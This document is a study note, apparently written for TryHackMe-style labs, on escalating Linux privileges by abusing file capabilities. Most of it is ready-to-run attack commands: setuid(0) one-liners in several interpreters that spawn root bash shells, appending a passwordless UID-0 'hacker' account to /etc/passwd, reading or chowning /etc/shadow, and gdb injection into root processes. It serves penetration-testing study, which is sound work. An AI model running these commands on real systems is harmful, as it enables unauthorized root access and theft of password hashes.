# Linux PrivEsc — 03. Linux Capabilities

> **Author:** Rasel Hossain | raselhossain79 | TryHackMe: theloser

---

## What are Linux Capabilities?

Traditionally in Linux:
- **Root (UID 0)** = has ALL privileges (read any file, kill any process, bind any port, etc.)
- **Normal user** = has almost no privileges

This binary system is a problem. Example: `ping` needs to create raw network packets — normally a root-only operation. Old solution was SUID on `ping` (run as root), which is overkill and dangerous.

**Capabilities solve this** by splitting root privileges into ~40 fine-grained units called "capabilities."

Instead of giving ping full root access, give it ONLY `cap_net_raw` (raw socket creation). That's it.

```
Without Capabilities:  ping needs SUID (= full root access) to create raw packets
With Capabilities:     ping has cap_net_raw ONLY (= just raw socket access)
```

**The PrivEsc angle:** If a binary has a capability like `cap_setuid` or `cap_dac_override`, we can abuse it to escalate privileges — WITHOUT the binary needing SUID.

---

## Capability Flags (Very Important)

Every capability can have three flags:

| Flag | Meaning |
|------|---------|
| `e` = Effective | Capability is ACTIVE right now, currently enforced |
| `p` = Permitted | Capability is allowed to be activated |
| `i` = Inheritable | Can be inherited by child processes |

**Combined flags:**
- `+ep` = Effective + Permitted = **MOST DANGEROUS** = capability is immediately active
- `+p` = Permitted only = can be activated but not currently active
- `+eip` = All three = effective, permitted, and inherited

**In exploit context:** We mainly care about `+ep` because the capability is immediately usable.

---

## View & Find Capabilities

### Check Specific Binary

```bash
getcap /usr/bin/python3
```
**Breakdown:**
- `getcap` = get file capabilities tool
- `/usr/bin/python3` = specific file to check
- Output example: `/usr/bin/python3 = cap_setuid+ep`
- Read as: python3 has cap_setuid capability, with effective+permitted flags

### Find ALL Binaries with Capabilities (Most Important)

```bash
getcap -r / 2>/dev/null
```
**Breakdown:**
- `-r` = recursive = search all directories from root `/`
- `2>/dev/null` = suppress "Permission denied" errors (no root needed)
- This is the **main enumeration command** for capabilities
- Run this on every target, always

### View Current Process Capabilities

```bash
cat /proc/self/status | grep Cap
```
**Breakdown:**
- `/proc/self/` = virtual directory for current process
- `/proc/self/status` = process status info
- `grep Cap` = filter lines containing "Cap"
- Output shows 5 hex values: CapInh, CapPrm, CapEff, CapBnd, CapAmb

```bash
capsh --decode=0000003fffffffff
```
**Breakdown:**
- `capsh` = capability shell wrapper / decoder
- `--decode=` = decode hex capability bitmask into human-readable capability names
- Use the hex values from `/proc/self/status` output

---

## Dangerous Capabilities Table

| Capability | Risk Level | What it allows |
|------------|------------|----------------|
| `cap_setuid` | CRITICAL | Change UID to any user (including root = UID 0) |
| `cap_setgid` | HIGH | Change GID to any group |
| `cap_dac_override` | CRITICAL | Bypass file read/write/execute permission checks |
| `cap_dac_read_search` | HIGH | Bypass file read permission + directory search |
| `cap_sys_admin` | CRITICAL | Huge range of admin operations (almost = root) |
| `cap_sys_ptrace` | HIGH | Trace/attach to any process, read/write its memory |
| `cap_net_bind_service` | MEDIUM | Bind to ports below 1024 without root |
| `cap_net_raw` | MEDIUM | Create raw/packet sockets, sniff traffic |
| `cap_chown` | HIGH | Change file ownership (chown any file to yourself) |
| `cap_fowner` | HIGH | Bypass ownership checks on file operations |
| `cap_kill` | MEDIUM | Send signals to any process (kill -9 any PID) |
| `cap_sys_chroot` | MEDIUM | Use chroot() to change root directory |

---

## Exploitation by Capability Type

### cap_setuid — Most Common & Easiest

`cap_setuid` allows a process to call `setuid()` to change its UID to 0 (root).

#### Python3 with cap_setuid

```bash
# Verify
getcap /usr/bin/python3
# Output: /usr/bin/python3 = cap_setuid+ep

# Exploit
python3 -c "import os; os.setuid(0); os.system('/bin/bash')"
```
**Breakdown:**
- `python3 -c "..."` = run Python code directly from command line
- `import os` = import the OS module (provides system call wrappers)
- `os.setuid(0)` = call setuid() system call with UID 0 = become root
  - This works because cap_setuid lets us call setuid() to any UID
- `os.system('/bin/bash')` = spawn bash shell
  - Now runs as root because we already changed UID to 0

#### Python2 with cap_setuid

```bash
getcap /usr/bin/python2
# Output: /usr/bin/python2 = cap_setuid+ep

python2 -c "import os; os.setuid(0); os.system('/bin/bash')"
```

#### Perl with cap_setuid

```bash
getcap /usr/bin/perl
# Output: /usr/bin/perl = cap_setuid+ep

perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```
**Breakdown:**
- `use POSIX qw(setuid)` = import setuid function from POSIX module
- `POSIX::setuid(0)` = call setuid(0) = become root
- `exec "/bin/bash"` = replace current perl process with bash (runs as root)

#### Ruby with cap_setuid

```bash
getcap /usr/bin/ruby
# Output: /usr/bin/ruby = cap_setuid+ep

ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'
```
**Breakdown:**
- `Process::Sys.setuid(0)` = Ruby's wrapper for setuid() system call
- `exec "/bin/bash"` = replace ruby process with bash shell as root

#### Node.js with cap_setuid

```bash
getcap /usr/bin/node
# Output: /usr/bin/node = cap_setuid+ep

node -e 'process.setuid(0); require("child_process").spawn("/bin/bash", {stdio: [0,1,2]})'
```
**Breakdown:**
- `process.setuid(0)` = Node.js setuid wrapper
- `child_process.spawn("/bin/bash", {stdio:[0,1,2]})` = spawn bash inheriting stdin/stdout/stderr

#### PHP with cap_setuid

```bash
getcap /usr/bin/php
# Output: /usr/bin/php = cap_setuid+ep

php -r "posix_setuid(0); system('/bin/bash');"
```
**Breakdown:**
- `posix_setuid(0)` = PHP's POSIX setuid function
- `system('/bin/bash')` = execute bash

#### Vim with cap_setuid

```bash
getcap /usr/bin/vim
# Output: /usr/bin/vim = cap_setuid+ep

vim -c ':py3 import os; os.setuid(0); os.execl("/bin/bash", "bash", "-c", "reset; exec bash")'
```
**Breakdown:**
- `vim -c 'command'` = run vim command on startup
- `:py3` = execute Python3 code inside vim
- `os.execl("/bin/bash", ...)` = replace vim process with bash as root
- `reset` = reset terminal settings (vim messes them up)

---

### cap_dac_override — Bypass File Permissions

`cap_dac_override` = DAC stands for Discretionary Access Control = normal Linux file permissions.
Override means: bypass permission checks completely. Read/write/execute ANY file regardless of permissions.

```bash
getcap /usr/bin/vim
# Output: /usr/bin/vim = cap_dac_override+ep
```

**Abuse — Write to /etc/passwd:**

```bash
# Open /etc/passwd even if permissions deny it
vim /etc/passwd
```

Inside vim, add a new root user line:
```
# First generate password hash
openssl passwd -1 -salt xyz password123
# Output: $1$xyz$ABC123...

# Add this line to /etc/passwd in vim:
hacker:$1$xyz$ABC123...:0:0:root:/root:/bin/bash
```

```bash
# Now switch to new root user
su hacker
# Password: password123
id  # uid=0(root)
```

**Abuse — Read /etc/shadow:**

```bash
vim /etc/shadow    # cap_dac_override lets you read it despite permissions
# Copy the hashes, crack them offline
```

**Abuse via Python with cap_dac_override:**

```bash
getcap /usr/bin/python3
# Output: /usr/bin/python3 = cap_dac_override+ep

# Read any file
python3 -c "print(open('/etc/shadow').read())"

# Write to any file (add root user to /etc/passwd)
python3 -c "
open('/etc/passwd','a').write('hacker::0:0:root:/root:/bin/bash\n')
"
# Note: empty password field = no password needed
su hacker   # No password required → root shell
```
**Breakdown:**
- `open('/etc/shadow').read()` = open file and read all content
- `open('/etc/passwd','a').write(...)` = open file in append mode `'a'` and write
- `'hacker::0:0:root:/root:/bin/bash'` = username:nopassword:UID0:GID0:comment:home:shell

---

### cap_dac_read_search — Read Any File

Similar to cap_dac_override but only for reading (not writing).

```bash
getcap /usr/bin/tar
# Output: /usr/bin/tar = cap_dac_read_search+ep

# Read /etc/shadow by archiving it
tar -czf /tmp/shadow_backup.tar.gz /etc/shadow
tar -xzf /tmp/shadow_backup.tar.gz -C /tmp/
cat /tmp/etc/shadow
```
**Breakdown:**
- `tar -czf` = create compressed archive: `-c`=create, `-z`=gzip, `-f`=filename
- `tar -xzf` = extract: `-x`=extract, `-z`=gzip, `-f`=filename
- `-C /tmp/` = extract to /tmp directory
- Even though `/etc/shadow` is normally not readable, cap_dac_read_search bypasses this

```bash
# With python3 having cap_dac_read_search
getcap /usr/bin/python3
# Output: /usr/bin/python3 = cap_dac_read_search+ep

python3 -c "import os; fd=os.open('/etc/shadow',os.O_RDONLY); print(os.read(fd,4096).decode())"
```

---

### cap_sys_ptrace — Process Memory Injection

`cap_sys_ptrace` allows attaching to any process with ptrace() and reading/writing its memory.

```bash
getcap /usr/bin/gdb
# Output: /usr/bin/gdb = cap_sys_ptrace+ep

# Find a root process to inject into
ps aux | grep root | grep -v grep
# Pick a PID, e.g., 1234

# Attach and inject shellcode
gdb -p 1234
```

Inside GDB:
```gdb
call (void)system("/bin/bash")
```
**Breakdown:**
- `gdb -p PID` = attach GDB to running process
- `call (void)system("/bin/bash")` = inject function call into target process
- Because target process runs as root → spawned bash is root

**Python script for cap_sys_ptrace exploitation:**

```bash
# Find root process PID
ps aux | grep root | grep -v "grep\|\[" | head -5

# Using Python's ctypes to inject shellcode
python3 inject.py <ROOT_PID>
```

---

### cap_net_bind_service — Bind to Privileged Ports

Normally ports < 1024 require root. This capability allows binding without root.

```bash
getcap /usr/bin/python3
# Output: /usr/bin/python3 = cap_net_bind_service+ep

# Run a service on port 80 (normally requires root)
python3 -m http.server 80
```
**Why relevant:** If you can serve on port 80 or 443, you can potentially MITM or intercept traffic.

---

### cap_chown — Change File Ownership

Allows changing ownership of any file to yourself.

```bash
getcap /usr/bin/python3
# Output: /usr/bin/python3 = cap_chown+ep

# Make /etc/shadow owned by us (then we can read it)
python3 -c "import os; os.chown('/etc/shadow', 1001, 1001)"
# 1001 = your UID

# Now read it
cat /etc/shadow
```
**Breakdown:**
- `os.chown(path, uid, gid)` = change file ownership
- After changing ownership to your UID, you can read/write the file normally

---

## Full Exploitation Workflow

```bash
# Step 1: Find all capabilities
getcap -r / 2>/dev/null
# Example output:
# /usr/bin/python3.8 = cap_setuid+ep
# /usr/bin/ping = cap_net_raw+ep
# /usr/bin/vim.basic = cap_dac_override+ep

# Step 2: Identify exploitable ones
# cap_setuid+ep on python3 → instant root

# Step 3: Exploit
python3 -c "import os; os.setuid(0); os.system('/bin/bash')"

# Step 4: Confirm
id      # uid=0(root)
whoami  # root
```

---

## GTFOBins for Capabilities

Always check: **https://gtfobins.github.io/** → click any binary → look for "Capabilities" section

Common ones:
```
python   + cap_setuid → os.setuid(0)
perl     + cap_setuid → POSIX::setuid(0)  
ruby     + cap_setuid → Process::Sys.setuid(0)
node     + cap_setuid → process.setuid(0)
php      + cap_setuid → posix_setuid(0)
vim      + cap_dac_override → edit any file
tar      + cap_dac_read_search → read any file
```

---

## Quick Checklist

```
[ ] getcap -r / 2>/dev/null              → find ALL capabilities
[ ] Look for cap_setuid+ep               → setuid(0) = instant root
[ ] Look for cap_dac_override+ep         → write to /etc/passwd, read /etc/shadow
[ ] Look for cap_dac_read_search+ep      → read any file (/etc/shadow)
[ ] Look for cap_sys_ptrace+ep           → inject into root processes
[ ] Look for cap_chown+ep                → chown /etc/shadow to yourself
[ ] Cross-reference with GTFOBins        → https://gtfobins.github.io
```
